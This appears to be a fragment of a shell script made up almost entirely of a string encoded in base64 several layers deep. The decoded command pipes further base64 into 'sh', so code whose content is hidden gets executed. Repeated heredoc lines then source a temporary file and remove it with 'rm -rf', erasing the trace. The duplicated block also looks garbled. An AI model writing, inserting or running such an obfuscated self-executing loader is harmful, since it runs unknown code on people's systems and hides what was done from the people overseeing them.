Y3hjMk14Y0ZSUFZ6Rm9Wak5vYzFremF6VldiRXBWVld0b1dsWjZSbk5VUkVaUFlqRnNXRlZ1V210TlZrbzFWMVprVDJOc2NGbFRhMXBzVTBaS05WZFdUVFZXUjBaSVVtMTBhVTB5VWxaWk1qRkhZVzFGZVZadWJGTlhSMmQzV1RJeFJtUnNWWGxTYWtwaFZqRkdNbFpWWkVkamJVNDFUMWMxV2xaNlJuTlhSRTVEWVVkU1NGUnRPVmxsYTBZeFZGWlNhbVJWTVVST1NHaE9Wa2RrTTFSdWF6RmtNV3hZWXpCMGFsSjZRbTVaVm1NeFpXMVNTRkp1VG1sUk1FWXdXVEpzUW1Sc2NFaFNha0phVlhwc2Ixa3dhRUprYkd0NVQxaFNUV0pyU1hoWFZ6RnFaRmRGZWxOdVVtbE5hM0IzV1d0a1ZtTlZkM2xUYldocVRXeFdNVmRXYUVOamEwNTFWRzVPWVZZeFdqTlRWVkpLVXpGd1dGUnRPV2xsVlVad1UxVldiMlJ0VGtoV1YyUllWbnByZUZOVlZsZGtWMFowVDFSV1lWWXhSbTVQUlc5eVYxZHNjRkZYYkVSaVZscHhXVlZqTkZvd2JIQlJhM2hoVmpGYU0xTlZXazlOVjA1SlVXNWFhbUpzU25kWmJURnFaRlY0Y0U1SVZsaGxWVXBXVjJ4a1IyUkdSbGRUYkZaS1VtcENibE5YWkhkaVJtdDVZVWhhU2xFd2JHNVdSRTVyWkZad1dWTlhaRkJoVkVKdVZWVlZlR0ZHV2tsVGJrSnNVa2R6ZDFSWGNFWmFNR3h1WTBkNFdrMXRhREpUVlU1S1dqRk9kRTlZUW1saFZVcEZXVlZrUjJSWFNuUldiazVLVWtjNU1GTlZWa05rUm14WlZXNXNhRmRIYUZGWGJURmhZMFpyZVdKSGFHbFNSVlp1VTFka2QyVnRTa2hXYlhocVVUQkdOVkV5TVZkaGJVWklUMGRrU21GVlVuQmliR3N6WVZjMVdtVnRiSFZYVkdSd1lteHNObUZYTlZwT1IyUllaVlZLUjFZd1ZuTldWV3hIVFVkak1HTkVTbEJPU0VGNVZGUlNkMDFyT0RCalJFcE9Ua2hCZVZRd2JFUlRWREJ1WmtOQ2FWbFlUbXhPYWxGblRGZFJaMlpEUW5waFFUMDlKM3dnWW1GelpUWTBJQzFrSUh3Z2MyZz0nfCBiYXNlNjQgLWQgfCBzaA==
DIXIE
source ${PIXIE}
rm -rf ${PIXIE}
DIXIE
source ${PIXIE}
rm -rf ${PIXIE}